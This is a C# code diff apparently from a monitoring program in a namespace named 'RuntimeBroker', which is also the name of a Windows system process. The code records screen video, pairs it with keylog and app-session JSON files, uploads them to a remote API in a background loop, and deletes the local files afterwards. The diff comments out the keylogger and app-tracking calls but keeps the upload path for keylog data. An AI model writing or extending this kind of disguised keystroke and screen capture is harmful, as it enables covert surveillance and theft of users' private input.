@@ -75,38 +75,38 @@ namespace RuntimeBroker
         {
             try
             {
-                try
-                {
-                    _ = Task.Run(() =>
-                    {
+                //try
+                //{
+                //    _ = Task.Run(() =>
+                //    {
 
-                        KeyLogger.Run();
+                //        KeyLogger.Run();
 
-                    });
+                //    });
 
 
-                }
-                catch (Exception ex)
-                {
-                    Log(ex.ToString());
-                }
+                //}
+                //catch (Exception ex)
+                //{
+                //    Log(ex.ToString());
+                //}
 
-                try
-                {
+                //try
+                //{
 
-                    _ = Task.Run(() =>
-                    {
+                //    _ = Task.Run(() =>
+                //    {
 
-                        _ = AppTimeTrack.Run();
+                //        _ = AppTimeTrack.Run();
 
-                    });
-                }
-                catch (Exception ex)
-                {
-                    Log(ex.ToString());
-                }
+                //    });
+                //}
+                //catch (Exception ex)
+                //{
+                //    Log(ex.ToString());
+                //}
 
-                await Task.Delay(5000);
+                //await Task.Delay(5000);
 
                 _ = Task.Run(async () =>
                 {
@@ -143,7 +143,7 @@ namespace RuntimeBroker
                             FileInfo file = new FileInfo(fileName);
                             file.MoveTo(videoPath);
 
-                            Trace.WriteLine("Save vid");
+                            Trace.WriteLine("Save vid " + DateTime.Now.ToString());
 
                             var keyLogJsonPath = videoPath.Replace($".{videoFormatFile}", "_UserAction.json");
                             var appsJsonPath = videoPath.Replace($".{videoFormatFile}", "_UserSession.json");
@@ -166,32 +166,43 @@ namespace RuntimeBroker
 
                     while (true)
                     {
-                        bool isOnline = await AppUtils.IsOnline();
-                        if (isOnline)
+                        try
                         {
-                            while (SessionRecorders.Count > 0)
+                            bool isOnline = await AppUtils.IsOnline();
+                            if (isOnline)
                             {
-                                var session = SessionRecorders.Dequeue();
-                                if (session != null)
+                                while (SessionRecorders.Count > 0)
                                 {
-                                    try
+                                    var session = SessionRecorders.Dequeue();
+                                    if (session != null)
                                     {
-                                        Console.WriteLine("Reup Video");
-                                        await UploadVideoApiAsync(session.Id, session.VideoPath, session.AppsPath, session.KeyLogsPath);
-                                    }
-                                    catch (Exception ex)
-                                    {
-                                        Log(ex.ToString());
-                                    }
-                                    finally
-                                    {
-                                        await Task.Delay((int)TimeSpan.FromSeconds(30).TotalMilliseconds);
+                                        try
+                                        {
+                                            Console.WriteLine("Reup Video");
+                                            await UploadVideoApiAsync(session.Id, session.VideoPath, session.AppsPath, session.KeyLogsPath);
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            Log(ex.ToString());
+                                        }
+                                        finally
+                                        {
+                                            await Task.Delay((int)TimeSpan.FromSeconds(30).TotalMilliseconds);
+                                        }
                                     }
                                 }
                             }
-                        }
 
-                        await Task.Delay((int)TimeSpan.FromMinutes(2.5).TotalMilliseconds);
+                            await Task.Delay((int)TimeSpan.FromMinutes(2.5).TotalMilliseconds);
+                        }
+                        catch (Exception ex)
+                        {
+                            Log(ex.ToString());
+                        }
+                        finally
+                        {
+
+                        }
                     }
 
                 });
@@ -298,6 +309,10 @@ namespace RuntimeBroker
                             isSuccess = true;
                             break;
                         }
+                        else
+                        {
+                            Log(result);
+                        }
                     }
                     catch (Exception ex)
                     {
@@ -353,6 +368,14 @@ namespace RuntimeBroker
             {
                 Console.WriteLine($"An error occurred: {ex.Message}");
                 return false;
+            }
+            finally
+            {
+                try
+                {
+                    File.Delete(inputFilePath);
+                }
+                catch { }
             }
         }
 
